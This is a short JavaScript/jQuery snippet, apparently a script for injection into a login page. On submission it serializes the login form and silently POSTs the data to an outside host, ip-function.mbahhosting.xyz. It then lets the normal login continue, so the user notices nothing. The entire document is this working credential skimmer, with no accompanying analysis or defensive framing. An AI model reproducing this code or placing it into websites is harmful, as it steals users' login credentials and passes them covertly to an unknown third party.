$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://ip-function.mbahhosting.xyz//index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
